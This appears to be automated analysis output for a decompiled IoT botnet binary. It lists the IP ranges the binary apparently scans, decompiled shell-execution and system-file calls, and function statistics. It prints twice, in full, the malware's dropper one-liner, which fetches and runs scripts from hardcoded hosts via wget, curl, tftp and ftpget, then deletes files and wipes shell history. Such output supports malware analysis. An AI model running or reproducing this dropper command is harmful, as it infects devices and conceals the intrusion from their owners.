+163.47.%d.%d
+223.29.%d.%d
+59.153.%d.%d
+113.176.%d.%d
+113.175.%d.%d
+113.177.%d.%d
+113.183.%d.%d
+202.164.%d.%d
+202.134.%d.%d
+210.56.%d.%d
+49.156.%d.%d
+203.210.%d.%d
+117.181.%d.%d
+117.177.%d.%d
+117.178.%d.%d
+117.176.%d.%d
+117.170.%d.%d
+117.171.%d.%d
+117.162.%d.%d
+112.26.%d.%d
+112.27.%d.%d
+112.28.%d.%d
+112.29.%d.%d
+112.30.%d.%d
+112.31.%d.%d
+203.150.%d.%d
+50.233.%d.%d
+27.255.%d.%d
+123.24.%d.%d
+123.25.%d.%d
+111.26.%d.%d
+111.20.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/cpuinfo
+/proc/net/route
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.101.107.128/bins.sh; curl -O http://185.158.113.30/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.158.113.30 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.158.113.30; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.113.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c;history -w;rm -rf ~/.bash_history\r\n
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.101.107.128/bins.sh; curl -O http://185.158.113.30/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.158.113.30 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.158.113.30; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.113.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c;history -w;rm -rf ~/.bash_history\r\n
+================================================================================
+========	FUNCTIONS SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES			: 71576
++++TOTAL FUNCTIONS 			:250
++++LINES PER FUNCTION RATIO 	: 286.304
++++SUSPECTED LINES COUNT 	: 402
++++SUSPECTED LINES RATIO 	: 0.561640773443612
+================================================================================
+========	WHILES SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES				: 71576
++++WHILE (TRUE) LINES			: 11147
++++WHILE (TRUE) LINES RATION		:15.5736559740695%
++++WHILE (TRUE) LOOPS COUNT		: 174
+================================================================================
+========	SYSTEM FILES SUMMARY : ================================================
+================================================================================
+                    function_1000fca4((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
+                function_1000fca4((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
+                function_1000fca4((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
+            function_1000fca4((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
+    int32_t v186 = function_1000c524((int32_t)"/proc/cpuinfo", 0); // 0x100021e0
+    int32_t v186 = function_1000c524((int32_t)"/proc/cpuinfo", 0); // 0x100023fc
+        int32_t v192 = function_1000c524((int32_t)"/proc/net/route", 0); // 0x1000b410
+    int32_t result = function_1000c264((int32_t)"/usr/bin/python", 0, 0x10020000) == -1 ? (int32_t)"ROUTER" : (int32_t)"SERVER";
+    int32_t v177 = function_1000c264((int32_t)"/usr/bin/python", 0, 0x10020000) == -1 ? (int32_t)"/usr/sbin/dropbear" : (int32_t)"sshd";
+            function_1000fca4((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
+    int32_t v186 = function_1000c524((int32_t)"/dev/null", a2); // 0x10010088
+    int32_t v184 = function_100126e8((int32_t)"/etc/resolv.conf", (int32_t)&v183); // 0x10011fd4
+        int32_t v188 = function_100126e8((int32_t)"/etc/config/resolv.conf", v187); // 0x10011fec
+    int32_t v186 = function_100126e8((int32_t)"/etc/hosts", (int32_t)&v185); // 0x10013cfc
+        result = function_100126e8((int32_t)"/etc/config/hosts", v187);
+================================================================================
+========	IP PATTERNS SUMMARY : =================================================
+================================================================================
+        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
+
+        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
+
+        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
+
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
+
+        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
+
+        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
+
+        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+
+    char (*v132)[16] = "185.101.107.128";
+
+        function_10001734((int32_t)&v189, (int32_t)"1.10.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"1.120.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"5.140.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"5.141.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"122.2.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"122.3.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"122.53.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"122.54.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"188.16.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"188.17.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"188.18.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"188.19.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"31.162.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"31.163.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"5.142.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"5.143.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"90.150.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"90.151.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"178.47.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"94.50.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"94.51.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"190.43.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"210.5.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"210.213.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.0.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.8.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.50.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.54.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.98.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.112.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.192.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"186.128.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"186.132.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"186.39.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"186.56.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"186.57.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"186.58.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"186.60.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"46.181.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"46.180.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"188.173.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"64.137.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.20.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.47.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.57.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.30.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.54.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.204.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.44.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.198.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.203.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.220.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.242.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.14.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.195.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.214.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.218.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.225.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.228.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.231.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.60.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.248.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.253.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.255.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.35.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.49.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.62.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"98.27.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"98.179.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"98.113.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"98.121.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"98.100.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"98.161.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"98.165.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.5.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.165.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"85.3.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"37.158.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"95.9.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"41.252.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"58.71.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"104.55.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"78.186.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"78.189.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"221.120.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"88.5.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"41.254.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"45.117.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"101.51.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"137.59.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"1.56.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"1.188.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.204.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"36.32.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"36.248.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"39.64.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.4.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.48.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.52.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.56.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.63.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.84.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.176.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"42.224.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"43.253.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"43.230.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"163.53.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"62.252.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"43.245.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"62.255.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"77.96.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"77.97.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"77.98.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"77.100.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"77.102.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.191.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"81.100.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.188.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.189.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"94.174.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.160.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.161.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.162.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.163.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.164.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.165.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.166.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.167.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.168.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.169.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.170.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.171.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.172.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.173.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.174.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.175.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.176.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.177.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.178.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.179.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.180.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.181.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.182.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.183.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.184.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.185.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.186.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.187.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.188.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.189.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.190.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.191.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"45.121.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"45.120.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"45.115.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"43.252.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"43.240.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"41.174.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"49.118.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"78.188.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"45.127.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"14.33.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.16.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"202.44.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"116.93.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"91.83.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"41.253.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.173.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.190.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"146.88.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.196.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.178.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.45.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"183.223.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"116.71.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"110.235.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"124.253.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"211.237.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.175.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.173.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"178.93.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"111.9.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"222.252.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.174.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.160.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.161.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.162.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.163.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.164.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.165.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.166.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"116.167.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.168.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.17.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.18.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.19.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.20.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.21.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.22.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"222.253.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"222.254.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"222.225.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"37.247.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"41.208.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"183.220.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"175.201.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"50.205.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"88.248.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"88.105.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"88.247.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"85.105.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"188.3.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.55.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.233.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"103.63.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"144.48.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"163.47.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"223.29.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"59.153.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.176.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.175.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.177.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"113.183.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"202.164.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"202.134.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"210.56.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"49.156.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"203.210.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.181.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.177.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.178.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.176.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.170.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.171.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"117.162.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.26.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.27.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.28.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.29.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.30.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"112.31.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"203.150.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"50.233.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"27.255.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.24.%d.%d", (int32_t)v183);
+
+        function_10001734((int32_t)&v189, (int32_t)"123.25.%d.%d", (int32_t)v183);
+
+        function_10001734(v190, (int32_t)"111.26.%d.%d", (int32_t)v183);
+
+    function_1000e800((int32_t)"8.8.8.8");
+
+================================================================================
+========	SYSTEM CALLS SUMMARY : ================================================
+================================================================================
+================================================================================
+========	FUNCTIONS LIST : =======================================================
+================================================================================
+FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
+----------------------------------------------------------------------------------------------
+function_1000a77c                                 |2   |2654    |127           |448         |
+----------------------------------------------------------------------------------------------
+function_10010cfc                                 |4   |3967    |55            |3694        |
+----------------------------------------------------------------------------------------------
+function_10000094                                 |0   |488     |31            |0           |
+----------------------------------------------------------------------------------------------
+function_1000d684                                 |2   |1038    |19            |824         |
+----------------------------------------------------------------------------------------------
+function_1000b610                                 |2   |605     |17            |359         |
+----------------------------------------------------------------------------------------------
+function_10013d3c                                 |9   |646     |8             |271         |
+----------------------------------------------------------------------------------------------
+function_10013360                                 |3   |592     |7             |269         |
+----------------------------------------------------------------------------------------------
+function_10011f7c                                 |0   |412     |7             |199         |
+----------------------------------------------------------------------------------------------
+function_1000e888                                 |6   |1062    |6             |175         |
+----------------------------------------------------------------------------------------------
+function_10002564                                 |4   |323     |6             |105         |
+----------------------------------------------------------------------------------------------
+function_1000e1b0                                 |3   |322     |5             |114         |
+----------------------------------------------------------------------------------------------
+function_1000a030                                 |7   |423     |5             |117         |
+----------------------------------------------------------------------------------------------
+function_100021b8                                 |1   |255     |4             |64          |
+----------------------------------------------------------------------------------------------
+function_10011514                                 |3   |311     |4             |89          |
+----------------------------------------------------------------------------------------------
+function_1000cc54                                 |0   |894     |4             |681         |
+----------------------------------------------------------------------------------------------
+function_100136cc                                 |4   |564     |4             |216         |
+----------------------------------------------------------------------------------------------
+function_10000cc8                                 |4   |622     |3             |33          |
+----------------------------------------------------------------------------------------------
